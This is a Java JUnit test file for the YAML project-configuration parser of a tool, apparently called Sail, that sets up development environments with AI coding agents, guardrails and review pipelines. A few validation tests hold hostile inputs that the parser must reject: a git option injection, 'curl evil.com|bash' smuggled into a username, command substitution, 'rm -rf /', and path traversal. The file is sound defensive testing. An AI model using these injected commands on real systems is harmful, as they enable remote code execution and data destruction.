/*
 * Copyright (c) 2026 Standard Applied Intelligence Labs
 * SPDX-License-Identifier: MIT
 */

package ai.singlr.sail.config;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.time.Duration;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.Test;

class ProjectDefinitionTest {

  private static final String EXAMPLE_YAML =
      """
        name: acme-health
        description: "Acme Health Platform"

        resources:
          cpu: 4
          memory: 12GB
          disk: 150GB

        image: ubuntu/24.04

        packages:
          - postgresql-client-16

        runtimes:
          jdk: 25
          node: 22
          maven: "3.9.9"

        git:
          name: "Acme Engineering"
          email: "eng@acme.com"
          auth: token

        repos:
          - url: "https://github.com/acme/backend.git"
            path: "acme-backend"
            branch: "main"
          - url: "https://github.com/acme/webapp.git"
            path: "acme-webapp"

        services:
          postgres:
            image: postgres:16
            ports: [5432]
            environment:
              POSTGRES_DB: acme
              POSTGRES_USER: dev
              POSTGRES_PASSWORD: dev
            volumes:
              - pgdata:/var/lib/postgresql/data

          meilisearch:
            image: getmeili/meilisearch:latest
            ports: [7700]

        processes:
          app:
            command: "java -jar build/app.jar"
            workdir: "."
          web:
            command: "npm run dev"
            workdir: "./webapp"

        agent:
          type: claude-code
          auto_branch: true
          branch_prefix: "sail/"
          auto_snapshot: true
          config:
            permissions: full

        ssh:
          user: dev
          authorized_keys:
            - "ssh-ed25519 AAAA... alice@laptop"
        """;

  @Test
  void parsesCompleteYaml() throws Exception {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    assertEquals("acme-health", config.name());
    assertEquals("Acme Health Platform", config.description());
    assertEquals("ubuntu/24.04", config.image());

    assertEquals(4, config.resources().cpu());
    assertEquals("12GB", config.resources().memory());
    assertEquals("150GB", config.resources().disk());

    assertEquals(1, config.packages().size());
    assertEquals("postgresql-client-16", config.packages().getFirst());

    assertEquals(25, config.runtimes().jdk());
    assertEquals("22", config.runtimes().node());
    assertEquals("3.9.9", config.runtimes().maven());

    assertEquals("Acme Engineering", config.git().name());
    assertEquals("eng@acme.com", config.git().email());
    assertEquals("token", config.git().auth());

    assertEquals(2, config.repos().size());
    assertEquals("acme-backend", config.repos().getFirst().path());
    assertEquals("main", config.repos().getFirst().branch());
    assertEquals("acme-webapp", config.repos().get(1).path());
    assertNull(config.repos().get(1).branch());

    assertEquals(2, config.services().size());
    var pg = config.services().get("postgres");
    assertEquals("postgres:16", pg.image());
    assertEquals(5432, pg.ports().getFirst());
    assertEquals("acme", pg.environment().get("POSTGRES_DB"));

    assertEquals(2, config.processes().size());
    assertEquals("java -jar build/app.jar", config.processes().get("app").command());
    assertEquals("./webapp", config.processes().get("web").workdir());

    assertEquals("claude-code", config.agent().type());
    assertTrue(config.agent().autoBranch());
    assertEquals("sail/", config.agent().branchPrefix());
    assertTrue(config.agent().autoSnapshot());
    assertEquals("full", config.agent().config().get("permissions"));

    assertEquals("dev", config.ssh().user());
    assertEquals(1, config.ssh().authorizedKeys().size());
  }

  @Test
  void repoFromMapRejectsUrlThatLooksLikeAGitOption() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Repo.fromMap(
                    java.util.Map.of("url", "--upload-pack=touch /tmp/pwned", "path", "evil")));
    assertTrue(ex.getMessage().contains("repos[].url"));
  }

  @Test
  void repoFromMapRejectsUrlWithoutKnownScheme() {
    assertThrows(
        IllegalArgumentException.class,
        () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("url", "not-a-url", "path", "x")));
  }

  @Test
  void repoFromMapAcceptsHttpsAndScpUrls() {
    var https =
        ProjectDefinition.Repo.fromMap(
            java.util.Map.of("url", "https://github.com/acme/backend.git", "path", "backend"));
    assertEquals("https://github.com/acme/backend.git", https.url());

    var scp =
        ProjectDefinition.Repo.fromMap(
            java.util.Map.of("url", "git@github.com:acme/backend.git", "path", "backend"));
    assertEquals("git@github.com:acme/backend.git", scp.url());
  }

  @Test
  void resourcesFromMapThrowsOnMissingCpu() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Resources.fromMap(
                    java.util.Map.of("memory", "8GB", "disk", "50GB")));
    assertTrue(ex.getMessage().contains("resources.cpu"));
  }

  @Test
  void resourcesFromMapThrowsOnMissingMemory() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.Resources.fromMap(java.util.Map.of("cpu", 4, "disk", "50GB")));
    assertTrue(ex.getMessage().contains("resources.memory"));
  }

  @Test
  void runtimesDefaultsToZeroWhenMissing() {
    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of());
    assertEquals(0, runtimes.jdk());
    assertNull(runtimes.node());
    assertNull(runtimes.maven());
  }

  @Test
  void runtimesFromMapParsesPartialConfig() {
    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25));
    assertEquals(25, runtimes.jdk());
    assertNull(runtimes.node());
    assertNull(runtimes.maven());
  }

  @Test
  void runtimesFromMapParsesMaven() {
    var runtimes =
        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "maven", "3.9.9"));
    assertEquals("3.9.9", runtimes.maven());
  }

  @Test
  void gitFromMapDefaultsAuthToToken() {
    var git =
        ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test", "email", "test@test.com"));
    assertEquals("token", git.auth());
  }

  @Test
  void gitFromMapAcceptsSshAuth() {
    var git =
        ProjectDefinition.Git.fromMap(
            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
    assertEquals("ssh", git.auth());
  }

  @Test
  void gitFromMapThrowsOnMissingName() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("email", "test@test.com")));
    assertTrue(ex.getMessage().contains("git.name"));
  }

  @Test
  void gitFromMapThrowsOnMissingEmail() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.Git.fromMap(java.util.Map.of("name", "Test")));
    assertTrue(ex.getMessage().contains("git.email"));
  }

  @Test
  void gitFromMapThrowsOnInvalidAuth() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Git.fromMap(
                    java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "bad")));
    assertTrue(ex.getMessage().contains("git.auth"));
  }

  @Test
  void gitFromMapParsesSshKey() {
    var map = new java.util.HashMap<String, Object>();
    map.put("name", "Test");
    map.put("email", "test@test.com");
    map.put("auth", "ssh");
    map.put("ssh_key", "~/.ssh/id_ed25519");
    var git = ProjectDefinition.Git.fromMap(map);
    assertEquals("ssh", git.auth());
    assertEquals("~/.ssh/id_ed25519", git.sshKey());
  }

  @Test
  void gitFromMapSshKeyNullWhenAbsent() {
    var git =
        ProjectDefinition.Git.fromMap(
            java.util.Map.of("name", "Test", "email", "test@test.com", "auth", "ssh"));
    assertNull(git.sshKey());
  }

  @Test
  void gitToMapIncludesSshKeyWhenSet() {
    var git = new ProjectDefinition.Git("Test", "test@test.com", "ssh", "~/.ssh/id_ed25519");
    var map = git.toMap();
    assertEquals("~/.ssh/id_ed25519", map.get("ssh_key"));
  }

  @Test
  void gitToMapOmitsSshKeyWhenNull() {
    var git = new ProjectDefinition.Git("Test", "test@test.com", "token", null);
    var map = git.toMap();
    assertFalse(map.containsKey("ssh_key"));
  }

  @Test
  void gitSshKeyRoundTripsViaToMapFromMap() {
    var original = new ProjectDefinition.Git("Dev", "dev@test.com", "ssh", "~/.ssh/id_ed25519");
    var roundTripped = ProjectDefinition.Git.fromMap(original.toMap());
    assertEquals("ssh", roundTripped.auth());
    assertEquals("~/.ssh/id_ed25519", roundTripped.sshKey());
  }

  @Test
  void repoFromMapThrowsOnMissingUrl() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.Repo.fromMap(java.util.Map.of("path", "my-repo")));
    assertTrue(ex.getMessage().contains("repos[].url"));
  }

  @Test
  void repoFromMapThrowsOnMissingPath() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Repo.fromMap(
                    java.util.Map.of("url", "https://github.com/foo/bar")));
    assertTrue(ex.getMessage().contains("repos[].path"));
  }

  @Test
  void repoFromMapRejectsPathTraversal() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Repo.fromMap(
                    java.util.Map.of(
                        "url", "https://github.com/foo/bar", "path", "../../etc/passwd")));
    assertTrue(ex.getMessage().contains("repos[].path"));
  }

  @Test
  void repoFromMapRejectsInvalidBranch() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Repo.fromMap(
                    java.util.Map.of(
                        "url",
                        "https://github.com/foo/bar",
                        "path",
                        "app",
                        "branch",
                        "../escape")));
    assertTrue(ex.getMessage().contains("repos[].branch"));
  }

  @Test
  void sshFromMapRejectsInvalidUser() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Ssh.fromMap(java.util.Map.of("user", "dev; curl evil.com|bash")));
    assertTrue(ex.getMessage().contains("Invalid ssh.user"));
  }

  @Test
  void runtimesFromMapRejectsInvalidMavenVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Runtimes.fromMap(
                    java.util.Map.of("jdk", 25, "maven", "3.9.9$(evil)")));
    assertTrue(ex.getMessage().contains("runtimes.maven"));
  }

  @Test
  void runtimesFromMapRejectsInvalidNodeVersion() {
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Runtimes.fromMap(
                    java.util.Map.of("jdk", 25, "node", "22; rm -rf /")));
    assertTrue(ex.getMessage().contains("runtimes.node"));
  }

  @Test
  void serviceEnvironmentConvertsBooleanAndNumberValues() {
    var envMap = new java.util.LinkedHashMap<String, Object>();
    envMap.put("MEILI_ENV", "development");
    envMap.put("MEILI_NO_ANALYTICS", true);
    envMap.put("POOL_SIZE", 10);
    var serviceMap =
        java.util.Map.<String, Object>of("image", "meilisearch:latest", "environment", envMap);

    var service = ProjectDefinition.Service.fromMap(serviceMap);

    assertEquals("development", service.environment().get("MEILI_ENV"));
    assertEquals("true", service.environment().get("MEILI_NO_ANALYTICS"));
    assertEquals("10", service.environment().get("POOL_SIZE"));
  }

  @Test
  void runtimesNodePreservesDoubleVersion() {
    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.4));
    assertEquals("22.4", runtimes.node());
  }

  @Test
  void runtimesNodeWholeDoubleBecomesInteger() {
    var runtimes = ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", 22.0));
    assertEquals("22", runtimes.node());
  }

  @Test
  void runtimesNodeStringVersionWithMultipleDots() {
    var runtimes =
        ProjectDefinition.Runtimes.fromMap(java.util.Map.of("jdk", 25, "node", "24.13.1"));
    assertEquals("24.13.1", runtimes.node());
  }

  @Test
  void sshUserReturnsSshUserWhenConfigured() throws Exception {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    assertEquals("dev", config.sshUser());
  }

  @Test
  void sshUserDefaultsToDevWhenNoSshBlock() throws Exception {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));

    assertEquals("dev", config.sshUser());
  }

  @Test
  void repoPathsReturnsAbsolutePathsForEachRepo() throws Exception {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));

    var paths = config.repoPaths();

    assertEquals(2, paths.size());
    assertEquals("/home/dev/workspace/acme-backend", paths.get(0));
    assertEquals("/home/dev/workspace/acme-webapp", paths.get(1));
  }

  @Test
  void repoPathsReturnsWorkspaceRootWhenNoRepos() throws Exception {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));

    var paths = config.repoPaths();

    assertEquals(1, paths.size());
    assertEquals("/home/dev/workspace", paths.getFirst());
  }

  @Test
  void repoPathsUsesSshUser() throws Exception {
    var yaml =
        """
        name: test
        ssh:
          user: alice
        repos:
          - url: "https://github.com/test/app.git"
            path: "app"
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertEquals("/home/alice/workspace/app", config.repoPaths().getFirst());
  }

  @Test
  void retiredGuardrailKeyNamesTheProjectAndExactEdit() {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          guardrails:
            idle_timeout: 90m
        """;
    var refusal =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));

    assertEquals(
        "Unknown guardrail key `idle_timeout` in test/sail.yaml; rename `idle_timeout` to"
            + " `max_idle` in test/sail.yaml.",
        refusal.getMessage());
  }

  @Test
  void specsDirIsRejectedWithAnExactEdit() {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          specs_dir: specs
        """;
    var ex =
        assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)));
    assertEquals(
        "Unknown agent key `specs_dir` in test/sail.yaml; remove `specs_dir` from test/sail.yaml"
            + " because specs live in the Sail database.",
        ex.getMessage());
  }

  @Test
  void agentGuardrailsNullWhenNotConfigured() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertNull(config.agent().guardrails());
  }

  @Test
  void notificationsParsedFromYaml() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          notifications:
            url: "https://ntfy.sh/singlr-test"
            events:
              - guardrail_triggered
              - agent_session_stopped
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertNotNull(config.agent().notifications());
    assertEquals("https://ntfy.sh/singlr-test", config.agent().notifications().url());
    assertEquals(2, config.agent().notifications().events().size());
  }

  @Test
  void notificationsNullWhenNotConfigured() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertNull(config.agent().notifications());
  }

  @Test
  void handlesMinimalYaml() throws Exception {
    var minimal =
        """
            name: simple-project
            description: "Just a name and description"
            """;

    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(minimal));

    assertEquals("simple-project", config.name());
    assertNull(config.resources());
    assertNull(config.git());
    assertNull(config.repos());
    assertNull(config.services());
    assertNull(config.agent());
  }

  @Test
  void toMapRoundTripsCompleteConfig() throws Exception {
    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    var map = original.toMap();
    var roundTripped = ProjectDefinition.fromMap(map);

    assertEquals(original.name(), roundTripped.name());
    assertEquals(original.description(), roundTripped.description());
    assertEquals(original.resources().cpu(), roundTripped.resources().cpu());
    assertEquals(original.resources().memory(), roundTripped.resources().memory());
    assertEquals(original.resources().disk(), roundTripped.resources().disk());
    assertEquals(original.image(), roundTripped.image());
    assertEquals(original.packages(), roundTripped.packages());
    assertEquals(original.runtimes().jdk(), roundTripped.runtimes().jdk());
    assertEquals(original.runtimes().node(), roundTripped.runtimes().node());
    assertEquals(original.runtimes().maven(), roundTripped.runtimes().maven());
    assertEquals(original.git().name(), roundTripped.git().name());
    assertEquals(original.git().email(), roundTripped.git().email());
    assertEquals(original.git().auth(), roundTripped.git().auth());
    assertEquals(original.git().sshKey(), roundTripped.git().sshKey());
    assertEquals(original.repos().size(), roundTripped.repos().size());
    assertEquals(original.repos().getFirst().url(), roundTripped.repos().getFirst().url());
    assertEquals(original.repos().getFirst().branch(), roundTripped.repos().getFirst().branch());
    assertEquals(original.services().size(), roundTripped.services().size());
    assertEquals(
        original.services().get("postgres").image(),
        roundTripped.services().get("postgres").image());
    assertEquals(original.processes().size(), roundTripped.processes().size());
    assertEquals(original.agent().type(), roundTripped.agent().type());
    assertEquals(original.agent().autoBranch(), roundTripped.agent().autoBranch());
    assertEquals(original.agent().autoSnapshot(), roundTripped.agent().autoSnapshot());
    assertEquals(original.ssh().user(), roundTripped.ssh().user());
    assertEquals(original.ssh().authorizedKeys(), roundTripped.ssh().authorizedKeys());
  }

  @Test
  void toMapOmitsNullFields() throws Exception {
    var minimal = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));
    var map = minimal.toMap();

    assertEquals("test", map.get("name"));
    assertFalse(map.containsKey("resources"));
    assertFalse(map.containsKey("runtimes"));
    assertFalse(map.containsKey("git"));
    assertFalse(map.containsKey("repos"));
    assertFalse(map.containsKey("services"));
    assertFalse(map.containsKey("agent"));
    assertFalse(map.containsKey("ssh"));
  }

  @Test
  void toMapPreservesServiceEnvironment() throws Exception {
    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(EXAMPLE_YAML));
    var map = original.toMap();
    @SuppressWarnings("unchecked")
    var services = (java.util.Map<String, Object>) map.get("services");
    @SuppressWarnings("unchecked")
    var pg = (java.util.Map<String, Object>) services.get("postgres");
    @SuppressWarnings("unchecked")
    var env = (java.util.Map<String, String>) pg.get("environment");

    assertEquals("acme", env.get("POSTGRES_DB"));
    assertEquals("dev", env.get("POSTGRES_USER"));
  }

  @Test
  void toMapPreservesGuardrails() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          guardrails:
            max_duration: 4h
            action: snapshot-and-stop
        """;
    var original = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));
    var map = original.toMap();
    var roundTripped = ProjectDefinition.fromMap(map);

    assertEquals("4h", roundTripped.agent().guardrails().maxDuration());
    assertEquals("snapshot-and-stop", roundTripped.agent().guardrails().action());
  }

  @Test
  void withNodeRuntimeAddsNodeToExistingRuntimes() throws Exception {
    var yaml =
        """
        name: test
        resources:
          cpu: 2
          memory: 4GB
          disk: 20GB
        runtimes:
          jdk: 25
          maven: "3.9.9"
        agent:
          type: codex
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    var updated = config.withNodeRuntime("24.14.1");

    assertEquals(25, updated.runtimes().jdk());
    assertEquals("24.14.1", updated.runtimes().node());
    assertEquals("3.9.9", updated.runtimes().maven());
    assertEquals("test", updated.name());
    assertEquals("codex", updated.agent().type());
  }

  @Test
  void withNodeRuntimeCreatesRuntimesWhenNull() {
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap("name: test"));

    var updated = config.withNodeRuntime("22.0.0");

    assertNotNull(updated.runtimes());
    assertEquals("22.0.0", updated.runtimes().node());
    assertEquals(0, updated.runtimes().jdk());
    assertNull(updated.runtimes().maven());
  }

  @Test
  void withAgentInstallReplacesInstallList() throws Exception {
    var yaml =
        """
        name: test
        agent:
          type: claude-code
          auto_branch: true
          install:
            - claude-code
            - codex
        """;
    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    var updated = config.withAgentInstall(List.of("claude-code"));

    assertEquals(List.of("claude-code"), updated.agent().install());
    assertEquals("claude-code", updated.agent().type());
    assertTrue(updated.agent().autoBranch());
  }

  @Test
  void eachLaneReadsItsOwnGuardrailsAndItsOwnDefaults() {
    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
    var configured =
        ProjectDefinition.Agent.fromMap(
            Map.of(
                "type",
                "claude-code",
                "guardrails",
                Map.of("max_duration", "6h"),
                "review_pipeline",
                Map.of("guardrails", Map.of("max_duration", "90m", "max_idle", "30m"))));

    for (var lane : Lane.values()) {
      var review = lane == Lane.REVIEW;
      assertEquals(
          review ? Guardrails.reviewDefaults() : Guardrails.defaults(),
          bare.guardrailsFor(lane),
          lane + " with no block");
      assertEquals(
          review ? new Guardrails("90m", "30m", "stop") : new Guardrails("6h", null, "stop"),
          configured.guardrailsFor(lane),
          lane + " with both blocks");
    }
    assertEquals(Guardrails.defaults(), bare.guardrailsFor(null), "an unknown lane is a build's");
  }

  @Test
  void aRunsLifetimeIsItsLanesLimitAndABuildNothingBoundsHasNone() {
    var bare = ProjectDefinition.Agent.fromMap(Map.of("type", "claude-code"));
    var configured =
        ProjectDefinition.Agent.fromMap(
            Map.of(
                "type",
                "claude-code",
                "guardrails",
                Map.of("max_duration", "6h"),
                "review_pipeline",
                Map.of("guardrails", Map.of("max_duration", "90m"))));
    var unlimited =
        ProjectDefinition.Agent.fromMap(
            Map.of(
                "type",
                "claude-code",
                "guardrails",
                Map.of("max_idle", "30m"),
                "review_pipeline",
                Map.of("guardrails", Map.of("max_idle", "30m"))));

    for (var lane : Lane.values()) {
      var review = lane == Lane.REVIEW;
      assertEquals(
          review ? Duration.ofMinutes(45) : null, bare.lifetimeFor(lane), lane + " with no block");
      assertEquals(
          review ? Duration.ofMinutes(90) : Duration.ofHours(6),
          configured.lifetimeFor(lane),
          lane + " with both blocks");
      assertNull(unlimited.lifetimeFor(lane), lane + " under a block that names no time limit");
    }
    assertNull(bare.lifetimeFor(null), "an unknown lane is a build's");
  }

  @Test
  void anInvalidReviewLaneGuardrailFailsTheDescriptorWhereItIsValidated() {
    var refused =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Agent.fromMap(
                    Map.of(
                        "type",
                        "claude-code",
                        "review_pipeline",
                        Map.of("guardrails", Map.of("max_duration", "1 hour"))),
                    "acme/sail.yaml"));

    assertTrue(
        refused
            .getMessage()
            .startsWith(
                "Invalid `agent.review_pipeline.guardrails.max_duration` in acme/sail.yaml: "),
        refused.getMessage());
    assertTrue(refused.getMessage().contains("4h, 90m, 30s"), refused.getMessage());
  }

  @Test
  void aReviewLaneGuardrailsValueThatIsNoBlockIsRefusedRatherThanReadAsTheDefaults() {
    var refused =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Agent.fromMap(
                    Map.of("type", "claude-code", "review_pipeline", Map.of("guardrails", "90m")),
                    "acme/sail.yaml"));

    assertTrue(
        refused
            .getMessage()
            .startsWith("Invalid `agent.review_pipeline.guardrails` in acme/sail.yaml: "),
        refused.getMessage());
    assertTrue(refused.getMessage().contains("max_duration: 45m"), refused.getMessage());
  }

  @Test
  void aBuildLaneGuardrailsValueThatIsNoBlockIsRefusedNamingTheBlock() {
    var refused =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Agent.fromMap(
                    Map.of("type", "claude-code", "guardrails", "4h"), "acme/sail.yaml"));

    assertTrue(
        refused.getMessage().startsWith("Invalid `agent.guardrails` in acme/sail.yaml: "),
        refused.getMessage());
  }

  @Test
  void anActionSailDoesNotKnowIsRefusedNamingItsBlockItsFileAndTheOnesItDoes() {
    var refused =
        assertThrows(
            IllegalArgumentException.class,
            () ->
                ProjectDefinition.Agent.fromMap(
                    Map.of(
                        "type",
                        "claude-code",
                        "review_pipeline",
                        Map.of("guardrails", Map.of("action", "halt"))),
                    "acme/sail.yaml"));

    assertTrue(
        refused
            .getMessage()
            .startsWith("Invalid `agent.review_pipeline.guardrails.action` in acme/sail.yaml: "),
        refused.getMessage());
    assertTrue(
        refused.getMessage().contains("stop, snapshot-and-stop, notify"), refused.getMessage());
  }

  @Test
  void theReviewPipelineSurvivesAnAgentRoundTripAndAnInstallListChange() {
    var agent =
        ProjectDefinition.Agent.fromMap(
            Map.of(
                "type",
                "claude-code",
                "review_pipeline",
                Map.of(
                    "guardrails",
                    Map.of("max_duration", "90m"),
                    "stages",
                    List.of(
                        Map.of(
                            "name",
                            "security",
                            "agent",
                            "codex",
                            "brief",
                            "Judge the security surface.",
                            "gate",
                            "no_critical_or_high"),
                        Map.of("name", "sign-off", "type", "human")))));

    @SuppressWarnings("unchecked")
    var pipeline = (Map<String, Object>) agent.toMap().get("review_pipeline");
    var reparsed = ProjectDefinition.fromMap(Map.of("name", "acme", "agent", agent.toMap()));
    var reinstalled = reparsed.withAgentInstall(List.of("claude-code", "codex"));

    assertEquals(Map.of("max_duration", "90m", "action", "stop"), pipeline.get("guardrails"));
    assertEquals(
        agent.reviewPipeline(),
        reparsed.agent().reviewPipeline(),
        "the block a pipeline writes parses back to the same pipeline, stages included");
    assertEquals(
        agent.reviewPipeline(),
        reinstalled.agent().reviewPipeline(),
        "changing the install list keeps the pipeline, its stages and its limits");
  }

  @Test
  void aDeletedKeyIsRefusedInOneSentenceNamingWhereItsTextGoes() {
    var agent = "name: acme\nagent:\n  type: claude-code\n";

    assertEquals(
        "agent_context is no longer read: sail writes no context file. Put what it said in the"
            + " repo's AGENTS.md, and a rule in a project skill (sail project skills add). Then"
            + " remove `agent_context` from acme/sail.yaml.",
        refusal(agent + "agent_context:\n  tech_stack: Java\n"));
    assertEquals(
        "agent.methodology is no longer read: sail's work prompt tells the agent to run the"
            + " project's verification. Put the commands in the repo's AGENTS.md. Then remove"
            + " `agent.methodology` from acme/sail.yaml.",
        refusal(agent + "  methodology:\n    verify: mvn verify\n"));
    assertEquals(
        "agent.build_skill is no longer read: sail's work prompt says how a build runs. Put what"
            + " the skill said in the repo's AGENTS.md, or keep it as a project skill (sail"
            + " project skills add) the agent invokes when relevant. Then remove `agent.build_skill` from"
            + " acme/sail.yaml.",
        refusal(agent + "  build_skill: acme-build\n"));
    assertEquals(
        "agent.review_pipeline.fix_skill is no longer read: a fix run reads the build's work"
            + " prompt. Put what the skill said in the repo's AGENTS.md, or keep it as a project"
            + " skill (sail project skills add). Then remove `agent.review_pipeline.fix_skill`"
            + " from acme/sail.yaml.",
        refusal(agent + "  review_pipeline:\n    fix_skill: acme-fix\n"));
    assertEquals(
        "agent.review_pipeline.stages[security].skill is no longer read: a stage judges under its"
            + " brief. Put what the skill said in the stage's brief"
            + " (agent.review_pipeline.stages[security].brief), or keep it as a project skill"
            + " (sail project skills add) the brief tells the stage to run.",
        refusal(
            agent + "  review_pipeline:\n    stages:\n      - name: security\n        skill: x\n"));
    assertEquals(
        "agent.review_pipeline.stages[security].categories is no longer read: what a stage"
            + " focuses on is its brief. Say it in agent.review_pipeline.stages[security].brief.",
        refusal(
            agent
                + "  review_pipeline:\n    stages:\n      - name: security\n        categories: [a]\n"));
  }

  @Test
  void aBriefIsTextOnAnAgentStageWithinThePromptBudget() {
    var agent = "name: acme\nagent:\n  type: claude-code\n  review_pipeline:\n    stages:\n";

    assertEquals(
        "agent.review_pipeline.stages[sign-off].brief is set on a human stage; a person follows no"
            + " brief, so remove it.",
        refusal(agent + "      - name: sign-off\n        type: human\n        brief: Look.\n"));
    assertEquals(
        "agent.review_pipeline.stages[review].brief is 32001 code points; the limit is 32000.",
        refusal(agent + "      - name: review\n        brief: " + "x".repeat(32_001) + "\n"));
    assertEquals(
        "agent.review_pipeline.stages[review].brief is blank; write it or remove it.",
        refusal(agent + "      - name: review\n        brief: '  '\n"));
    assertEquals(
        "agent.review_pipeline.stages[review].brief must be text.",
        refusal(agent + "      - name: review\n        brief: [a]\n"));
    var stage =
        ProjectDefinition.fromMap(
                YamlUtil.parseMap(agent + "      - name: review\n        brief: Judge.\n"))
            .agent()
            .reviewPipeline()
            .stages()
            .getFirst();
    assertEquals("Judge.", stage.brief());
    assertEquals(
        stage,
        ReviewPipelineConfig.StageConfig.fromMap(stage.toMap()),
        "a stage with a brief writes it and reads it back");
  }

  private static String refusal(String yaml) {
    return assertThrows(
            IllegalArgumentException.class,
            () -> ProjectDefinition.fromMap(YamlUtil.parseMap(yaml)))
        .getMessage();
  }

  @Test
  void aRepoMayBeMarkedAsAGitHubHostAndNothingElse() {
    var yaml =
        "name: acme\nrepos:\n  - url: https://git.example.com/org/api.git\n    path: api\n"
            + "    forge: github\n  - url: https://gitlab.com/org/web.git\n    path: web\n";

    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertEquals("github", config.repos().getFirst().forge());
    assertNull(config.repos().getLast().forge());
    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "forge round-trips");
    assertEquals(
        "repos[].forge must be 'github' when set, got: gitlab",
        refusal(yaml.replace("forge: github", "forge: gitlab")));
    assertEquals(
        "repos[].forge must be text when set.",
        refusal(yaml.replace("forge: github", "forge: [a]")));
  }

  @Test
  void theProjectsMemberDefaultsToItsAgentWithFullAccess() {
    var config =
        ProjectDefinition.fromMap(YamlUtil.parseMap("name: acme\nagent:\n  type: claude-code\n"));

    assertNull(config.agent().member());
    assertEquals(
        new ProjectDefinition.Member("claude-code", null, "full"), config.agent().projectMember());
    assertFalse(config.agent().toMap().containsKey("member"), "init writes no member key");
  }

  @Test
  void aDeclaredMemberIsReadAndRoundTrips() {
    var yaml =
        "name: acme\nagent:\n  type: claude-code\n  install: [claude-code, codex]\n"
            + "  member:\n    agent: codex\n    model: gpt-5-codex\n    mode: read_only\n";

    var config = ProjectDefinition.fromMap(YamlUtil.parseMap(yaml));

    assertEquals(
        new ProjectDefinition.Member("codex", "gpt-5-codex", "read_only"),
        config.agent().projectMember());
    assertEquals(List.of("claude-code", "codex"), config.agent().installs());
    assertEquals(config, ProjectDefinition.fromMap(config.toMap()), "member round-trips");
  }

  @Test
  void aMemberTheProjectDoesNotInstallIsRefusedNamingTheField() {
    var yaml = "name: acme\nagent:\n  type: claude-code\n  member:\n    agent: codex\n";

    assertEquals(
        "agent.member.agent 'codex' is not a harness acme/sail.yaml installs (claude-code). Add"
            + " it to agent.install, or name one of those.",
        refusal(yaml));
  }

  @Test
  void anImplicitMemberTheProjectDoesNotInstallIsRefusedNamingTheField() {
    var yaml = "name: acme\nagent:\n  type: claude-code\n  install: [codex]\n";

    assertEquals(
        "agent.member.agent 'claude-code' is not a harness acme/sail.yaml installs (codex). Add"
            + " it to agent.install, or name one of those.",
        refusal(yaml));
  }

  @Test
